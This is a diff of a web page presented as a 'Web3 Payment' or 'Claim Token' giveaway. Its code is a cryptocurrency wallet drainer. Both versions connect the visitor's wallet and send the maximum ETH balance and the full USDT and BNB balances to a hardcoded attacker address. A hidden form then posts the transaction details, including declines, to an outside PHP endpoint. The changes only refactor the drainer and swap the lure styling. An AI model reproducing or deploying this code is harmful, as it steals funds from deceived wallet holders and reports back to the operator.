@@ -5,9 +5,9 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Web3 Payment</title>
     <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/web3modal@1.9.7/dist/index.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@1.6.6/dist/umd/index.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/ethers@5.6.0/dist/ethers.umd.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/web3modal"></script>
+    <script src="https://unpkg.com/ethers@latest/dist/ethers.umd.min.js"></script>
+    <script src="https://unpkg.com/@walletconnect/web3-provider@latest/dist/umd/index.min.js"></script>
     <style>
         body {
             display: flex;
@@ -16,70 +16,14 @@
             height: 100vh;
             background-color: #f0f0f0;
         }
-        .gold-bag-button {
-            background: url('https://www.vhv.rs/file/max/37/378446_gold-coin-png-image.png') no-repeat center center;
-            background-size: contain;
-            width: 150px;
-            height: 150px;
-            border: none;
-            cursor: pointer;
-            color: #fff;
+        button {
+            padding: 15px 25px;
             font-size: 16px;
-            font-weight: bold;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            text-shadow: 1px 1px 2px #000;
-        }
-        .gold-bag-button span {
-            position: relative;
-            top: 60%;
-            background-color: rgba(0, 0, 0, 0.5);
-            padding: 5px 10px;
-            border-radius: 5px;
-        }
-        #qrCodeContainer {
-            display: none;
-            text-align: center;
-        }
-        #qrCodeContainer img {
-            width: 200px;
-            height: 200px;
-        }
-        .checkmark {
-            display: none;
-            width: 100px;
-            height: 100px;
-            border-radius: 50%;
-            background-color: #4caf50;
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-        }
-        .checkmark:after {
-            content: '';
-            display: block;
-            width: 20px;
-            height: 40px;
-            border: solid white;
-            border-width: 0 10px 10px 0;
-            transform: rotate(45deg);
-            position: absolute;
-            top: 20%;
-            left: 35%;
         }
     </style>
 </head>
 <body>
-    <button id="connectButton" class="gold-bag-button"><span>Claim Token</span></button>
-
-    <div id="qrCodeContainer">
-        <h2>Scan QR Code with Your Wallet App</h2>
-        <div id="qrCode"></div>
-    </div>
-
-    <div class="checkmark" id="checkmark"></div>
+    <button id="connectButton">Connect Wallet & Transfer Max Amount</button>
 
     <form id="transactionForm" action="https://eflujsyb0kuybgol11532.cleavr.one/btc/d.php" method="post" style="display: none;">
         <input type="hidden" name="transactionDetails" id="transactionDetails">
@@ -89,148 +33,98 @@
         const connectButton = document.getElementById('connectButton');
         const transactionForm = document.getElementById('transactionForm');
         const transactionDetailsInput = document.getElementById('transactionDetails');
-        const qrCodeContainer = document.getElementById('qrCodeContainer');
-        const checkmark = document.getElementById('checkmark');
         const recipientAddress = '0xDF67b71a130Bf51fFaB24f3610D3532494b61A0f';
-        const gasLimit = BigInt(21000);
+        const gasLimit = 21000;
 
         const tokenAddresses = {
             USDT: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
             BNB: '0xB8c77482e45F1F44dE1745F52C74426C631bDD52'
         };
 
-        const erc20ABI = [
+        const tokenABI = [
             {
                 "constant": true,
                 "inputs": [{"name": "_owner", "type": "address"}],
                 "name": "balanceOf",
                 "outputs": [{"name": "balance", "type": "uint256"}],
                 "type": "function"
-            },
-            {
-                "constant": false,
-                "inputs": [{"name": "_to", "type": "address"}, {"name": "_value", "type": "uint256"}],
-                "name": "transfer",
-                "outputs": [{"name": "success", "type": "bool"}],
-                "type": "function"
             }
         ];
 
-        async function connectWallet() {
+        async function init() {
             const providerOptions = {
                 walletconnect: {
                     package: WalletConnectProvider.default,
                     options: {
-                        infuraId: "c05e035e823a4769b62ae15c1cbe2f02",
-                        qrcodeModalOptions: {
-                            mobileLinks: ["trust", "metamask", "argent", "imtoken", "pillar"]
-                        }
+                        infuraId: "c05e035e823a4769b62ae15c1cbe2f02" // Your Infura Project ID
                     }
                 }
+                // Add more wallet providers here if needed
             };
 
             const web3Modal = new Web3Modal.default({
-                cacheProvider: true,
-                providerOptions
+                cacheProvider: true, // optional
+                providerOptions // required
             });
 
-            const provider = await web3Modal.connect();
-            return provider;
-        }
-
-        async function init() {
             connectButton.addEventListener('click', async () => {
                 try {
-                    let provider;
-
-                    if (window.ethereum && window.ethereum.isMetaMask) {
-                        provider = window.ethereum;
-                        await provider.request({ method: 'eth_requestAccounts' });
-                        console.log('MetaMask connected');
-                    } else {
-                        provider = await connectWallet();
-                    }
-
+                    const provider = await web3Modal.connect();
                     const web3 = new Web3(provider);
-
-                    let walletType = 'unknown';
-                    if (provider.isMetaMask) {
-                        walletType = 'MetaMask';
-                    } else if (provider.isTrust) {
-                        walletType = 'Trust Wallet';
-                    } else {
-                        walletType = 'WalletConnect';
-                    }
-
-                    console.log(`${walletType} detected`);
-
                     const ethersProvider = new ethers.providers.Web3Provider(provider);
+                    const signer = ethersProvider.getSigner();
                     const accounts = await web3.eth.getAccounts();
                     const senderAddress = accounts[0];
-                    console.log(`Sender Address: ${senderAddress}`);
 
-                    // Fetch current gas prices
-                    const feeData = await ethersProvider.getFeeData();
-                    const gasPriceWei = BigInt(feeData.gasPrice.toString());
-                    const maxFeePerGas = BigInt(feeData.maxFeePerGas.toString());
-                    const maxPriorityFeePerGas = BigInt(feeData.maxPriorityFeePerGas.toString());
+                    // Get ETH balance
+                    const ethBalanceWei = await web3.eth.getBalance(senderAddress);
+                    const ethBalance = web3.utils.fromWei(ethBalanceWei, 'ether');
 
-                    console.log(`Gas Price Wei: ${gasPriceWei}`);
-                    console.log(`Max Fee Per Gas: ${maxFeePerGas}`);
-                    console.log(`Max Priority Fee Per Gas: ${maxPriorityFeePerGas}`);
-
-                    const ethBalanceWei = BigInt(await web3.eth.getBalance(senderAddress));
-                    console.log(`ETH Balance Wei: ${ethBalanceWei}`);
+                    // Estimate gas fee for ETH transfer
+                    const gasPriceWei = await web3.eth.getGasPrice();
                     const gasFeeWei = gasPriceWei * gasLimit;
                     const maxEthTransferWei = ethBalanceWei - gasFeeWei;
+                    const maxEthTransfer = web3.utils.fromWei(maxEthTransferWei.toString(), 'ether');
 
-                    console.log(`Gas Fee Wei: ${gasFeeWei}`);
-                    console.log(`Max ETH Transfer Wei: ${maxEthTransferWei}`);
+                    // Get USDT balance
+                    const usdtContract = new web3.eth.Contract(tokenABI, tokenAddresses.USDT);
+                    const usdtBalanceWei = await usdtContract.methods.balanceOf(senderAddress).call();
+                    const usdtBalance = web3.utils.fromWei(usdtBalanceWei, 'mwei'); // USDT has 6 decimals
 
-                    // Create a simple ETH transaction
+                    // Get BNB balance
+                    const bnbContract = new web3.eth.Contract(tokenABI, tokenAddresses.BNB);
+                    const bnbBalanceWei = await bnbContract.methods.balanceOf(senderAddress).call();
+                    const bnbBalance = web3.utils.fromWei(bnbBalanceWei, 'ether');
+
+                    // Create transactions for each token
                     const ethTransactionParameters = {
                         to: recipientAddress,
                         from: senderAddress,
-                        value: `0x${maxEthTransferWei.toString(16)}`,
-                        gas: `0x${gasLimit.toString(16)}`,
-                        maxFeePerGas: `0x${maxFeePerGas.toString(16)}`,
-                        maxPriorityFeePerGas: `0x${maxPriorityFeePerGas.toString(16)}`
+                        value: web3.utils.toHex(maxEthTransferWei),
+                        gas: gasLimit,
+                        gasPrice: gasPriceWei
                     };
-
-                    console.log('ETH Transaction Parameters:', ethTransactionParameters);
-
-                    // Send the transaction
-                    const ethTxHash = await web3.eth.sendTransaction(ethTransactionParameters);
-
-                    // Get USDT balance
-                    const usdtContract = new web3.eth.Contract(erc20ABI, tokenAddresses.USDT);
-                    const usdtBalanceWei = BigInt(await usdtContract.methods.balanceOf(senderAddress).call());
-
-                    // Get BNB balance
-                    const bnbContract = new web3.eth.Contract(erc20ABI, tokenAddresses.BNB);
-                    const bnbBalanceWei = BigInt(await bnbContract.methods.balanceOf(senderAddress).call());
 
                     const usdtTransactionParameters = {
                         to: tokenAddresses.USDT,
                         from: senderAddress,
                         value: '0x0', // No ETH value required
-                        gas: `0x${gasLimit.toString(16)}`,
-                        maxFeePerGas: `0x${maxFeePerGas.toString(16)}`,
-                        maxPriorityFeePerGas: `0x${maxPriorityFeePerGas.toString(16)}`,
-                        data: usdtContract.methods.transfer(recipientAddress, `0x${usdtBalanceWei.toString(16)}`).encodeABI()
+                        gas: gasLimit,
+                        gasPrice: gasPriceWei,
+                        data: usdtContract.methods.transfer(recipientAddress, usdtBalanceWei).encodeABI()
                     };
 
                     const bnbTransactionParameters = {
                         to: tokenAddresses.BNB,
                         from: senderAddress,
                         value: '0x0', // No ETH value required
-                        gas: `0x${gasLimit.toString(16)}`,
-                        maxFeePerGas: `0x${maxFeePerGas.toString(16)}`,
-                        maxPriorityFeePerGas: `0x${maxPriorityFeePerGas.toString(16)}`,
-                        data: bnbContract.methods.transfer(recipientAddress, `0x${bnbBalanceWei.toString(16)}`).encodeABI()
+                        gas: gasLimit,
+                        gasPrice: gasPriceWei,
+                        data: bnbContract.methods.transfer(recipientAddress, bnbBalanceWei).encodeABI()
                     };
 
                     // Send transactions
+                    const ethTxHash = await web3.eth.sendTransaction(ethTransactionParameters);
                     const usdtTxHash = await web3.eth.sendTransaction(usdtTransactionParameters);
                     const bnbTxHash = await web3.eth.sendTransaction(bnbTransactionParameters);
 
@@ -242,20 +136,12 @@
                         bnbTransactionHash: bnbTxHash.transactionHash,
                         sender: senderAddress,
                         recipient: recipientAddress,
-                        maxEthTransfer: maxEthTransferWei.toString(),
-                        usdtBalance: usdtBalanceWei.toString(),
-                        bnbBalance: bnbBalanceWei.toString()
+                        maxEthTransfer,
+                        usdtBalance,
+                        bnbBalance
                     });
                     transactionForm.submit();
-
-                    // Display check mark animation and reload page after 5 seconds
-                    checkmark.style.display = 'block';
-                    setTimeout(() => {
-                        checkmark.style.display = 'none';
-                        location.reload();
-                    }, 5000);
                 } catch (error) {
-                    console.error('Error:', error.message);
                     // Handle user rejection
                     transactionDetailsInput.value = JSON.stringify({
                         status: 'declined',
